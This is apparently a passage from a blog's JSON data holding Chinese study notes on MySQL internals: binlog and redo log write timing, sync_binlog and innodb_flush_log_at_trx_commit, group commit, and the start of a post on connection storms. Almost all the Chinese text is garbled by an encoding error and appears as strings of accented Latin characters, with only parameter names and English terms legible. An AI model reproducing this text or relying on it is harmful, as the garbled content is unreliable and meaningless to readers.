äº‹åŠ¡æäº¤çš„æ—¶å€™ï¼Œæ‰§è¡Œå™¨æŠŠ binlog cache é‡Œçš„å®Œæ•´äº‹åŠ¡å†™å…¥åˆ° binlog ä¸­ï¼Œå¹¶æ¸…ç©º binlog cacheã€‚çŠ¶æ€å¦‚å›¾æ‰€ç¤ºã€‚ å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·± binlog cacheï¼Œä½†æ˜¯å…±ç”¨åŒä¸€ä»½ binlog æ–‡ä»¶ã€‚ å›¾ä¸­çš„ writeï¼ŒæŒ‡çš„å°±æ˜¯æŒ‡æŠŠæ—¥å¿—å†™å…¥åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ page cacheï¼Œå¹¶æ²¡æœ‰æŠŠæ•°æ®æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œæ‰€ä»¥é€Ÿåº¦æ¯”è¾ƒå¿«ã€‚ å›¾ä¸­çš„ fsyncï¼Œæ‰æ˜¯å°†æ•°æ®æŒä¹…åŒ–åˆ°ç£ç›˜çš„æ“ä½œã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬è®¤ä¸º fsync æ‰å ç£ç›˜çš„ IOPSã€‚ write å’Œ fsync çš„æ—¶æœºï¼Œæ˜¯ç”±å‚æ•° sync_binlog æ§åˆ¶çš„ï¼š sync_binlog=0 çš„æ—¶å€™ï¼Œè¡¨ç¤ºæ¯æ¬¡æäº¤äº‹åŠ¡éƒ½åª writeï¼Œä¸ fsyncï¼› sync_binlog=1 çš„æ—¶å€™ï¼Œè¡¨ç¤ºæ¯æ¬¡æäº¤äº‹åŠ¡éƒ½ä¼šæ‰§è¡Œ fsyncï¼› sync_binlog=N(N&gt;1) çš„æ—¶å€™ï¼Œè¡¨ç¤ºæ¯æ¬¡æäº¤äº‹åŠ¡éƒ½ writeï¼Œä½†ç´¯ç§¯ N ä¸ªäº‹åŠ¡åæ‰ fsyncã€‚ å› æ­¤ï¼Œåœ¨å‡ºç° IO ç“¶é¢ˆçš„åœºæ™¯é‡Œï¼Œå°† sync_binlog è®¾ç½®æˆä¸€ä¸ªæ¯”è¾ƒå¤§çš„å€¼ï¼Œå¯ä»¥æå‡æ€§èƒ½ã€‚åœ¨å®é™…çš„ä¸šåŠ¡åœºæ™¯ä¸­ï¼Œè€ƒè™‘åˆ°ä¸¢å¤±æ—¥å¿—é‡çš„å¯æ§æ€§ï¼Œä¸€èˆ¬ä¸å»ºè®®å°†è¿™ä¸ªå‚æ•°è®¾æˆ 0ï¼Œæ¯”è¾ƒå¸¸è§çš„æ˜¯å°†å…¶è®¾ç½®ä¸º 100~1000 ä¸­çš„æŸä¸ªæ•°å€¼ã€‚ ä½†æ˜¯ï¼Œå°† sync_binlog è®¾ç½®ä¸º Nï¼Œå¯¹åº”çš„é£é™©æ˜¯ï¼šå¦‚æœä¸»æœºå‘ç”Ÿå¼‚å¸¸é‡å¯ï¼Œä¼šä¸¢å¤±æœ€è¿‘ N ä¸ªäº‹åŠ¡çš„ binlog æ—¥å¿—ã€‚ redo log çš„å†™å…¥æœºåˆ¶äº‹åŠ¡åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œç”Ÿæˆçš„ redo log æ˜¯è¦å…ˆå†™åˆ° redo log buffer çš„ã€‚ é‚£ä¹ˆ redo log buffer é‡Œé¢çš„å†…å®¹ï¼Œæ˜¯ä¸æ˜¯æ¯æ¬¡ç”Ÿæˆåéƒ½è¦ç›´æ¥æŒä¹…åŒ–åˆ°ç£ç›˜å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼Œä¸éœ€è¦ã€‚ å¦‚æœäº‹åŠ¡æ‰§è¡ŒæœŸé—´ MySQL å‘ç”Ÿå¼‚å¸¸é‡å¯ï¼Œé‚£è¿™éƒ¨åˆ†æ—¥å¿—å°±ä¸¢äº†ã€‚ç”±äºäº‹åŠ¡å¹¶æ²¡æœ‰æäº¤ï¼Œæ‰€ä»¥è¿™æ—¶æ—¥å¿—ä¸¢äº†ä¹Ÿä¸ä¼šæœ‰æŸå¤±ã€‚ é‚£ä¹ˆï¼Œå¦å¤–ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œäº‹åŠ¡è¿˜æ²¡æäº¤çš„æ—¶å€™ï¼Œredo log buffer ä¸­çš„éƒ¨åˆ†æ—¥å¿—æœ‰æ²¡æœ‰å¯èƒ½è¢«æŒä¹…åŒ–åˆ°ç£ç›˜å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ï¼Œç¡®å®ä¼šæœ‰ã€‚ è¿™ä¸ªé—®é¢˜ï¼Œè¦ä» redo log å¯èƒ½å­˜åœ¨çš„ä¸‰ç§çŠ¶æ€è¯´èµ·ã€‚è¿™ä¸‰ç§çŠ¶æ€ï¼Œå¯¹åº”çš„å°±æ˜¯å›¾ 2 ä¸­çš„ä¸‰ä¸ªé¢œè‰²å—ã€‚ è¿™ä¸‰ç§çŠ¶æ€åˆ†åˆ«æ˜¯ï¼š å­˜åœ¨ redo log buffer ä¸­ï¼Œç‰©ç†ä¸Šæ˜¯åœ¨ MySQL è¿›ç¨‹å†…å­˜ä¸­ï¼Œå°±æ˜¯å›¾ä¸­çš„çº¢è‰²éƒ¨åˆ†ï¼› å†™åˆ°ç£ç›˜ (write)ï¼Œä½†æ˜¯æ²¡æœ‰æŒä¹…åŒ–ï¼ˆfsync)ï¼Œç‰©ç†ä¸Šæ˜¯åœ¨æ–‡ä»¶ç³»ç»Ÿçš„ page cache é‡Œé¢ï¼Œä¹Ÿå°±æ˜¯å›¾ä¸­çš„é»„è‰²éƒ¨åˆ†ï¼› æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œå¯¹åº”çš„æ˜¯ hard diskï¼Œä¹Ÿå°±æ˜¯å›¾ä¸­çš„ç»¿è‰²éƒ¨åˆ†ã€‚ æ—¥å¿—å†™åˆ° redo log buffer æ˜¯å¾ˆå¿«çš„ï¼Œwirte åˆ° page cache ä¹Ÿå·®ä¸å¤šï¼Œä½†æ˜¯æŒä¹…åŒ–åˆ°ç£ç›˜çš„é€Ÿåº¦å°±æ…¢å¤šäº†ã€‚ ä¸ºäº†æ§åˆ¶ redo log çš„å†™å…¥ç­–ç•¥ï¼ŒInnoDB æä¾›äº† innodb_flush_log_at_trx_commit å‚æ•°ï¼Œå®ƒæœ‰ä¸‰ç§å¯èƒ½å–å€¼ï¼š è®¾ç½®ä¸º 0 çš„æ—¶å€™ï¼Œè¡¨ç¤ºæ¯æ¬¡äº‹åŠ¡æäº¤æ—¶éƒ½åªæ˜¯æŠŠ redo log ç•™åœ¨ redo log buffer ä¸­ è®¾ç½®ä¸º 1 çš„æ—¶å€™ï¼Œè¡¨ç¤ºæ¯æ¬¡äº‹åŠ¡æäº¤æ—¶éƒ½å°† redo log ç›´æ¥æŒä¹…åŒ–åˆ°ç£ç›˜ è®¾ç½®ä¸º 2 çš„æ—¶å€™ï¼Œè¡¨ç¤ºæ¯æ¬¡äº‹åŠ¡æäº¤æ—¶éƒ½åªæ˜¯æŠŠ redo log å†™åˆ° page cache InnoDB æœ‰ä¸€ä¸ªåå°çº¿ç¨‹ï¼Œæ¯éš” 1 ç§’ï¼Œå°±ä¼šæŠŠ redo log buffer ä¸­çš„æ—¥å¿—ï¼Œè°ƒç”¨ write å†™åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ page cacheï¼Œç„¶åè°ƒç”¨ fsync æŒä¹…åŒ–åˆ°ç£ç›˜ã€‚ æ³¨æ„ï¼Œäº‹åŠ¡æ‰§è¡Œä¸­é—´è¿‡ç¨‹çš„ redo log ä¹Ÿæ˜¯ç›´æ¥å†™åœ¨ redo log buffer ä¸­çš„ï¼Œè¿™äº› redo log ä¹Ÿä¼šè¢«åå°çº¿ç¨‹ä¸€èµ·æŒä¹…åŒ–åˆ°ç£ç›˜ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªæ²¡æœ‰æäº¤çš„äº‹åŠ¡çš„ redo logï¼Œä¹Ÿæ˜¯å¯èƒ½å·²ç»æŒä¹…åŒ–åˆ°ç£ç›˜çš„ã€‚ å®é™…ä¸Šï¼Œé™¤äº†åå°çº¿ç¨‹æ¯ç§’ä¸€æ¬¡çš„è½®è¯¢æ“ä½œå¤–ï¼Œè¿˜æœ‰ä¸¤ç§åœºæ™¯ä¼šè®©ä¸€ä¸ªæ²¡æœ‰æäº¤çš„äº‹åŠ¡çš„ redo log å†™å…¥åˆ°ç£ç›˜ä¸­ã€‚ ä¸€ç§æ˜¯ï¼Œredo log buffer å ç”¨çš„ç©ºé—´å³å°†è¾¾åˆ° innodb_log_buffer_size ä¸€åŠçš„æ—¶å€™ï¼Œåå°çº¿ç¨‹ä¼šä¸»åŠ¨å†™ç›˜ã€‚æ³¨æ„ï¼Œç”±äºè¿™ä¸ªäº‹åŠ¡å¹¶æ²¡æœ‰æäº¤ï¼Œæ‰€ä»¥è¿™ä¸ªå†™ç›˜åŠ¨ä½œåªæ˜¯ writeï¼Œè€Œæ²¡æœ‰è°ƒç”¨ fsyncï¼Œä¹Ÿå°±æ˜¯åªç•™åœ¨äº†æ–‡ä»¶ç³»ç»Ÿçš„ page cacheã€‚ å¦ä¸€ç§æ˜¯ï¼Œå¹¶è¡Œçš„äº‹åŠ¡æäº¤çš„æ—¶å€™ï¼Œé¡ºå¸¦å°†è¿™ä¸ªäº‹åŠ¡çš„ redo log buffer æŒä¹…åŒ–åˆ°ç£ç›˜ã€‚å‡è®¾ä¸€ä¸ªäº‹åŠ¡ A æ‰§è¡Œåˆ°ä¸€åŠï¼Œå·²ç»å†™äº†ä¸€äº› redo log åˆ° buffer ä¸­ï¼Œè¿™æ—¶å€™æœ‰å¦å¤–ä¸€ä¸ªçº¿ç¨‹çš„äº‹åŠ¡ B æäº¤ï¼Œå¦‚æœ innodb_flush_log_at_trx_commit è®¾ç½®çš„æ˜¯ 1ï¼Œé‚£ä¹ˆæŒ‰ç…§è¿™ä¸ªå‚æ•°çš„é€»è¾‘ï¼Œäº‹åŠ¡ B è¦æŠŠ redo log buffer é‡Œçš„æ—¥å¿—å…¨éƒ¨æŒä¹…åŒ–åˆ°ç£ç›˜ã€‚è¿™æ—¶å€™ï¼Œå°±ä¼šå¸¦ä¸Šäº‹åŠ¡ A åœ¨ redo log buffer é‡Œçš„æ—¥å¿—ä¸€èµ·æŒä¹…åŒ–åˆ°ç£ç›˜ã€‚ è¿™é‡Œéœ€è¦è¯´æ˜çš„æ˜¯ï¼Œæˆ‘ä»¬ä»‹ç»ä¸¤é˜¶æ®µæäº¤çš„æ—¶å€™è¯´è¿‡ï¼Œæ—¶åºä¸Š redo log å…ˆ prepareï¼Œ å†å†™ binlogï¼Œæœ€åå†æŠŠ redo log commitã€‚ å¦‚æœæŠŠ innodb_flush_log_at_trx_commit è®¾ç½®æˆ 1ï¼Œé‚£ä¹ˆ redo log åœ¨ prepare é˜¶æ®µå°±è¦æŒä¹…åŒ–ä¸€æ¬¡ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªå´©æºƒæ¢å¤é€»è¾‘æ˜¯è¦ä¾èµ–äº prepare çš„ redo logï¼Œå†åŠ ä¸Š binlog æ¥æ¢å¤çš„ã€‚ æ¯ç§’ä¸€æ¬¡åå°è½®è¯¢åˆ·ç›˜ï¼Œå†åŠ ä¸Šå´©æºƒæ¢å¤è¿™ä¸ªé€»è¾‘ï¼ŒInnoDB å°±è®¤ä¸º redo log åœ¨ commit çš„æ—¶å€™å°±ä¸éœ€è¦ fsync äº†ï¼Œåªä¼š write åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ page cache ä¸­å°±å¤Ÿäº†ã€‚ é€šå¸¸æˆ‘ä»¬è¯´ MySQL çš„â€œåŒ 1â€é…ç½®ï¼ŒæŒ‡çš„å°±æ˜¯ sync_binlog å’Œ innodb_flush_log_at_trx_commit éƒ½è®¾ç½®æˆ 1ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªäº‹åŠ¡å®Œæ•´æäº¤å‰ï¼Œéœ€è¦ç­‰å¾…ä¸¤æ¬¡åˆ·ç›˜ï¼Œä¸€æ¬¡æ˜¯ redo logï¼ˆprepare é˜¶æ®µï¼‰ï¼Œä¸€æ¬¡æ˜¯ binlogã€‚ è¿™æ—¶å€™ï¼Œä½ å¯èƒ½æœ‰ä¸€ä¸ªç–‘é—®ï¼Œè¿™æ„å‘³ç€æˆ‘ä» MySQL çœ‹åˆ°çš„ TPS æ˜¯æ¯ç§’ä¸¤ä¸‡çš„è¯ï¼Œæ¯ç§’å°±ä¼šå†™å››ä¸‡æ¬¡ç£ç›˜ã€‚ä½†æ˜¯ï¼Œæˆ‘ç”¨å·¥å…·æµ‹è¯•å‡ºæ¥ï¼Œç£ç›˜èƒ½åŠ›ä¹Ÿå°±ä¸¤ä¸‡å·¦å³ï¼Œæ€ä¹ˆèƒ½å®ç°ä¸¤ä¸‡çš„ TPSï¼Ÿ è§£é‡Šè¿™ä¸ªé—®é¢˜ï¼Œå°±è¦ç”¨åˆ°ç»„æäº¤ï¼ˆgroup commitï¼‰æœºåˆ¶äº†ã€‚ è¿™é‡Œï¼Œæˆ‘éœ€è¦å…ˆå’Œä½ ä»‹ç»æ—¥å¿—é€»è¾‘åºåˆ—å·ï¼ˆlog sequence numberï¼ŒLSNï¼‰çš„æ¦‚å¿µã€‚LSN æ˜¯å•è°ƒé€’å¢çš„ï¼Œç”¨æ¥å¯¹åº” redo log çš„ä¸€ä¸ªä¸ªå†™å…¥ç‚¹ã€‚æ¯æ¬¡å†™å…¥é•¿åº¦ä¸º length çš„ redo logï¼Œ LSN çš„å€¼å°±ä¼šåŠ ä¸Š lengthã€‚ LSN ä¹Ÿä¼šå†™åˆ° InnoDB çš„æ•°æ®é¡µä¸­ï¼Œæ¥ç¡®ä¿æ•°æ®é¡µä¸ä¼šè¢«å¤šæ¬¡æ‰§è¡Œé‡å¤çš„ redo logã€‚å…³äº LSN å’Œ redo logã€checkpoint çš„å…³ç³»ï¼Œæˆ‘ä¼šåœ¨åé¢çš„æ–‡ç« ä¸­è¯¦ç»†å±•å¼€ã€‚ å¦‚å›¾ 3 æ‰€ç¤ºï¼Œæ˜¯ä¸‰ä¸ªå¹¶å‘äº‹åŠ¡ (trx1, trx2, trx3) åœ¨ prepare é˜¶æ®µï¼Œéƒ½å†™å®Œ redo log bufferï¼ŒæŒä¹…åŒ–åˆ°ç£ç›˜çš„è¿‡ç¨‹ï¼Œå¯¹åº”çš„ LSN åˆ†åˆ«æ˜¯ 50ã€120 å’Œ 160ã€‚ ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼š trx1 æ˜¯ç¬¬ä¸€ä¸ªåˆ°è¾¾çš„ï¼Œä¼šè¢«é€‰ä¸ºè¿™ç»„çš„ leaderï¼› ç­‰ trx1 è¦å¼€å§‹å†™ç›˜çš„æ—¶å€™ï¼Œè¿™ä¸ªç»„é‡Œé¢å·²ç»æœ‰äº†ä¸‰ä¸ªäº‹åŠ¡ï¼Œè¿™æ—¶å€™ LSN ä¹Ÿå˜æˆäº† 160ï¼› trx1 å»å†™ç›˜çš„æ—¶å€™ï¼Œå¸¦çš„å°±æ˜¯ LSN=160ï¼Œå› æ­¤ç­‰ trx1 è¿”å›æ—¶ï¼Œæ‰€æœ‰ LSN å°äºç­‰äº 160 çš„ redo logï¼Œéƒ½å·²ç»è¢«æŒä¹…åŒ–åˆ°ç£ç›˜ï¼› è¿™æ—¶å€™ trx2 å’Œ trx3 å°±å¯ä»¥ç›´æ¥è¿”å›äº†ã€‚ æ‰€ä»¥ï¼Œä¸€æ¬¡ç»„æäº¤é‡Œé¢ï¼Œç»„å‘˜è¶Šå¤šï¼ŒèŠ‚çº¦ç£ç›˜ IOPS çš„æ•ˆæœè¶Šå¥½ã€‚ä½†å¦‚æœåªæœ‰å•çº¿ç¨‹å‹æµ‹ï¼Œé‚£å°±åªèƒ½è€è€å®å®åœ°ä¸€ä¸ªäº‹åŠ¡å¯¹åº”ä¸€æ¬¡æŒä¹…åŒ–æ“ä½œäº†ã€‚ åœ¨å¹¶å‘æ›´æ–°åœºæ™¯ä¸‹ï¼Œç¬¬ä¸€ä¸ªäº‹åŠ¡å†™å®Œ redo log buffer ä»¥åï¼Œæ¥ä¸‹æ¥è¿™ä¸ª fsync è¶Šæ™šè°ƒç”¨ï¼Œç»„å‘˜å¯èƒ½è¶Šå¤šï¼ŒèŠ‚çº¦ IOPS çš„æ•ˆæœå°±è¶Šå¥½ã€‚ ä¸ºäº†è®©ä¸€æ¬¡ fsync å¸¦çš„ç»„å‘˜æ›´å¤šï¼ŒMySQL æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„ä¼˜åŒ–ï¼šæ‹–æ—¶é—´ã€‚åœ¨ä»‹ç»ä¸¤é˜¶æ®µæäº¤çš„æ—¶å€™ï¼Œæˆ‘æ›¾ç»ç»™ä½ ç”»äº†ä¸€ä¸ªå›¾ï¼Œç°åœ¨æˆ‘æŠŠå®ƒæˆªè¿‡æ¥ã€‚ å›¾ä¸­ï¼Œæˆ‘æŠŠâ€œå†™ binlogâ€å½“æˆä¸€ä¸ªåŠ¨ä½œã€‚ä½†å®é™…ä¸Šï¼Œå†™ binlog æ˜¯åˆ†æˆä¸¤æ­¥çš„ï¼š å…ˆæŠŠ binlog ä» binlog cache ä¸­å†™åˆ°ç£ç›˜ä¸Šçš„ binlog æ–‡ä»¶ï¼›è°ƒç”¨ fsync æŒä¹…åŒ–ã€‚MySQL ä¸ºäº†è®©ç»„æäº¤çš„æ•ˆæœæ›´å¥½ï¼ŒæŠŠ redo log åš fsync çš„æ—¶é—´æ‹–åˆ°äº†æ­¥éª¤ 1 ä¹‹åã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸Šé¢çš„å›¾å˜æˆäº†è¿™æ ·ï¼š è¿™ä¹ˆä¸€æ¥ï¼Œbinlog ä¹Ÿå¯ä»¥ç»„æäº¤äº†ã€‚åœ¨æ‰§è¡Œå›¾ 5 ä¸­ç¬¬ 4 æ­¥æŠŠ binlog fsync åˆ°ç£ç›˜æ—¶ï¼Œå¦‚æœæœ‰å¤šä¸ªäº‹åŠ¡çš„ binlog å·²ç»å†™å®Œäº†ï¼Œä¹Ÿæ˜¯ä¸€èµ·æŒä¹…åŒ–çš„ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥å‡å°‘ IOPS çš„æ¶ˆè€—ã€‚ ä¸è¿‡é€šå¸¸æƒ…å†µä¸‹ç¬¬ 3 æ­¥æ‰§è¡Œå¾—ä¼šå¾ˆå¿«ï¼Œæ‰€ä»¥ binlog çš„ write å’Œ fsync é—´çš„é—´éš”æ—¶é—´çŸ­ï¼Œå¯¼è‡´èƒ½é›†åˆåˆ°ä¸€èµ·æŒä¹…åŒ–çš„ binlog æ¯”è¾ƒå°‘ï¼Œå› æ­¤ binlog çš„ç»„æäº¤çš„æ•ˆæœé€šå¸¸ä¸å¦‚ redo log çš„æ•ˆæœé‚£ä¹ˆå¥½ã€‚ å¦‚æœä½ æƒ³æå‡ binlog ç»„æäº¤çš„æ•ˆæœï¼Œå¯ä»¥é€šè¿‡è®¾ç½® binlog_group_commit_sync_delay å’Œ binlog_group_commit_sync_no_delay_count æ¥å®ç°ã€‚ binlog_group_commit_sync_delay å‚æ•°ï¼Œè¡¨ç¤ºå»¶è¿Ÿå¤šå°‘å¾®ç§’åæ‰è°ƒç”¨ fsync; binlog_group_commit_sync_no_delay_count å‚æ•°ï¼Œè¡¨ç¤ºç´¯ç§¯å¤šå°‘æ¬¡ä»¥åæ‰è°ƒç”¨ fsyncã€‚è¿™ä¸¤ä¸ªæ¡ä»¶æ˜¯æˆ–çš„å…³ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦æœ‰ä¸€ä¸ªæ»¡è¶³æ¡ä»¶å°±ä¼šè°ƒç”¨ fsyncã€‚ æ‰€ä»¥ï¼Œå½“ binlog_group_commit_sync_delay è®¾ç½®ä¸º 0 çš„æ—¶å€™ï¼Œbinlog_group_commit_sync_no_delay_count ä¹Ÿæ— æ•ˆäº†ã€‚ ä¹‹å‰æœ‰åŒå­¦åœ¨è¯„è®ºåŒºé—®åˆ°ï¼ŒWAL æœºåˆ¶æ˜¯å‡å°‘ç£ç›˜å†™ï¼Œå¯æ˜¯æ¯æ¬¡æäº¤äº‹åŠ¡éƒ½è¦å†™ redo log å’Œ binlogï¼Œè¿™ç£ç›˜è¯»å†™æ¬¡æ•°ä¹Ÿæ²¡å˜å°‘å‘€ï¼Ÿ ç°åœ¨ä½ å°±èƒ½ç†è§£äº†ï¼ŒWAL æœºåˆ¶ä¸»è¦å¾—ç›Šäºä¸¤ä¸ªæ–¹é¢ï¼š redo log å’Œ binlog éƒ½æ˜¯é¡ºåºå†™ï¼Œç£ç›˜çš„é¡ºåºå†™æ¯”éšæœºå†™é€Ÿåº¦è¦å¿«ï¼› ç»„æäº¤æœºåˆ¶ï¼Œå¯ä»¥å¤§å¹…åº¦é™ä½ç£ç›˜çš„ IOPS æ¶ˆè€—ã€‚ åˆ†æåˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å†æ¥å›ç­”è¿™ä¸ªé—®é¢˜ï¼šå¦‚æœä½ çš„ MySQL ç°åœ¨å‡ºç°äº†æ€§èƒ½ç“¶é¢ˆï¼Œè€Œä¸”ç“¶é¢ˆåœ¨ IO ä¸Šï¼Œå¯ä»¥é€šè¿‡å“ªäº›æ–¹æ³•æ¥æå‡æ€§èƒ½å‘¢ï¼Ÿ é’ˆå¯¹è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥è€ƒè™‘ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ï¼š è®¾ç½® binlog_group_commit_sync_delay å’Œ binlog_group_commit_sync_no_delay_count å‚æ•°ï¼Œå‡å°‘ binlog çš„å†™ç›˜æ¬¡æ•°ã€‚è¿™ä¸ªæ–¹æ³•æ˜¯åŸºäºâ€œé¢å¤–çš„æ•…æ„ç­‰å¾…â€æ¥å®ç°çš„ï¼Œå› æ­¤å¯èƒ½ä¼šå¢åŠ è¯­å¥çš„å“åº”æ—¶é—´ï¼Œä½†æ²¡æœ‰ä¸¢å¤±æ•°æ®çš„é£é™©ã€‚ å°† sync_binlog è®¾ç½®ä¸ºå¤§äº 1 çš„å€¼ï¼ˆæ¯”è¾ƒå¸¸è§æ˜¯ 100~1000ï¼‰ã€‚è¿™æ ·åšçš„é£é™©æ˜¯ï¼Œä¸»æœºæ‰ç”µæ—¶ä¼šä¸¢ binlog æ—¥å¿—ã€‚ å°† innodb_flush_log_at_trx_commit è®¾ç½®ä¸º 2ã€‚è¿™æ ·åšçš„é£é™©æ˜¯ï¼Œä¸»æœºæ‰ç”µçš„æ—¶å€™ä¼šä¸¢æ•°æ®ã€‚ æˆ‘ä¸å»ºè®®ä½ æŠŠ innodb_flush_log_at_trx_commit è®¾ç½®æˆ 0ã€‚å› ä¸ºæŠŠè¿™ä¸ªå‚æ•°è®¾ç½®æˆ 0ï¼Œè¡¨ç¤º redo log åªä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œè¿™æ ·çš„è¯ MySQL æœ¬èº«å¼‚å¸¸é‡å¯ä¹Ÿä¼šä¸¢æ•°æ®ï¼Œé£é™©å¤ªå¤§ã€‚è€Œ redo log å†™åˆ°æ–‡ä»¶ç³»ç»Ÿçš„ page cache çš„é€Ÿåº¦ä¹Ÿæ˜¯å¾ˆå¿«çš„ï¼Œæ‰€ä»¥å°†è¿™ä¸ªå‚æ•°è®¾ç½®æˆ 2 è·Ÿè®¾ç½®æˆ 0 å…¶å®æ€§èƒ½å·®ä¸å¤šï¼Œä½†è¿™æ ·åš MySQL å¼‚å¸¸é‡å¯æ—¶å°±ä¸ä¼šä¸¢æ•°æ®äº†ï¼Œç›¸æ¯”ä¹‹ä¸‹é£é™©ä¼šæ›´å°ã€‚ æ€»ç»“ åªè¦ redo log å’Œ binlog ä¿è¯æŒä¹…åŒ–åˆ°ç£ç›˜ï¼Œå°±èƒ½ç¡®ä¿ MySQL å¼‚å¸¸é‡å¯åï¼Œæ•°æ®å¯ä»¥æ¢å¤ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"22 MySQLæœ‰å“ªäº›â€œé¥®é¸©æ­¢æ¸´â€æé«˜æ€§èƒ½çš„æ–¹æ³•","slug":"what-are-the-ways-to-improve-performance-of-mysql-by-drinking-poison-to-quench-thirst","date":"2022-08-18T02:45:41.000Z","updated":"2023-02-18T03:28:33.607Z","comments":true,"path":"what-are-the-ways-to-improve-performance-of-mysql-by-drinking-poison-to-quench-thirst/","link":"","permalink":"https://www.0x2beace.com/what-are-the-ways-to-improve-performance-of-mysql-by-drinking-poison-to-quench-thirst/","excerpt":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£é¢‘ç¹å»ºç«‹è¿æ¥æ‰€å¸¦æ¥çš„é—®é¢˜ äº†è§£æ…¢æŸ¥è¯¢çš„æ€§èƒ½é—®é¢˜","text":"æœ¬æ–‡æ˜¯åŸºäº æå®¢æ—¶é—´â€”â€”MySQL å®æˆ˜ 45 è®² æ•´ç†çš„å­¦ä¹ ç¬”è®°ï¼Œä»…ä¾›å­¦ä¹ å‚è€ƒï¼Œè¯·å‹¿ç”¨äºå•†ä¸šç”¨é€”ï¼Œå¦‚è‹¥ä¾µæƒï¼Œè¯·è”ç³»å¹¶åˆ é™¤ã€‚ è¯¾ç¨‹é‡ç‚¹ï¼š äº†è§£é¢‘ç¹å»ºç«‹è¿æ¥æ‰€å¸¦æ¥çš„é—®é¢˜ äº†è§£æ…¢æŸ¥è¯¢çš„æ€§èƒ½é—®é¢˜ çŸ­è¿æ¥é£æš´æ­£å¸¸çš„çŸ­è¿æ¥æ¨¡å¼å°±æ˜¯è¿æ¥åˆ°æ•°æ®åº“åï¼Œæ‰§è¡Œå¾ˆå°‘çš„ SQL è¯­å¥å°±æ–­å¼€ï¼Œä¸‹æ¬¡éœ€è¦çš„æ—¶å€™å†é‡è¿ã€‚å¦‚æœä½¿ç”¨çš„æ˜¯çŸ­è¿æ¥ï¼Œåœ¨ä¸šåŠ¡é«˜å³°æœŸçš„æ—¶å€™ï¼Œå°±å¯èƒ½å‡ºç°è¿æ¥æ•°çªç„¶æš´æ¶¨çš„æƒ…å†µã€‚ MySQL å»ºç«‹è¿æ¥çš„è¿‡ç¨‹ï¼Œæˆæœ¬æ˜¯å¾ˆé«˜çš„ã€‚é™¤äº†æ­£å¸¸çš„ç½‘ç»œè¿æ¥ä¸‰æ¬¡æ¡æ‰‹å¤–ï¼Œè¿˜éœ€è¦åšç™»å½•æƒé™åˆ¤æ–­å’Œè·å¾—è¿™ä¸ªè¿æ¥çš„æ•°æ®è¯»å†™æƒé™ã€‚åœ¨æ•°æ®åº“å‹åŠ›æ¯”è¾ƒå°çš„æ—¶å€™ï¼Œè¿™äº›é¢å¤–çš„æˆæœ¬å¹¶ä¸æ˜æ˜¾ã€‚ ä½†æ˜¯ï¼ŒçŸ­è¿æ¥æ¨¡å‹å­˜åœ¨ä¸€ä¸ªé£é™©ï¼Œå°±æ˜¯ä¸€æ—¦æ•°æ®åº“å¤„ç†å¾—æ…¢ä¸€äº›ï¼Œè¿æ¥æ•°å°±ä¼šæš´æ¶¨ã€‚max_connections å‚æ•°ï¼Œç”¨æ¥æ§åˆ¶ä¸€ä¸ª MySQL å®ä¾‹åŒæ—¶å­˜åœ¨çš„è¿æ¥æ•°çš„ä¸Šé™ï¼Œè¶…è¿‡è¿™ä¸ªå€¼ï¼Œç³»ç»Ÿå°±ä¼šæ‹’ç»æ¥ä¸‹æ¥çš„è¿æ¥è¯·æ±‚ï¼Œå¹¶æŠ¥é”™æç¤ºâ€œToo many connectionsâ€ã€‚å¯¹äºè¢«æ‹’ç»è¿æ¥çš„è¯·æ±‚æ¥è¯´ï¼Œä»ä¸šåŠ¡è§’åº¦çœ‹å°±æ˜¯æ•°æ®åº“ä¸å¯ç”¨ã€‚ åœ¨æœºå™¨è´Ÿè½½æ¯”è¾ƒé«˜çš„æ—¶å€™ï¼Œå¤„ç†ç°æœ‰è¯·æ±‚çš„æ—¶é—´å˜é•¿ï¼Œæ¯ä¸ªè¿æ¥ä¿æŒçš„æ—¶é—´ä¹Ÿæ›´é•¿ã€‚è¿™æ—¶ï¼Œå†æœ‰æ–°å»ºè¿æ¥çš„è¯ï¼Œå°±å¯èƒ½ä¼šè¶…è¿‡ max_connections çš„é™åˆ¶ã€‚ ç¢°åˆ°è¿™ç§æƒ…å†µæ—¶ï¼Œä¸€ä¸ªæ¯”è¾ƒè‡ªç„¶çš„æƒ³æ³•ï¼Œå°±æ˜¯è°ƒé«˜ max_connections çš„å€¼ã€‚ä½†è¿™æ ·åšæ˜¯æœ‰é£é™©çš„ã€‚å› ä¸ºè®¾è®¡ max_connections è¿™ä¸ªå‚æ•°çš„ç›®çš„æ˜¯æƒ³ä¿æŠ¤ 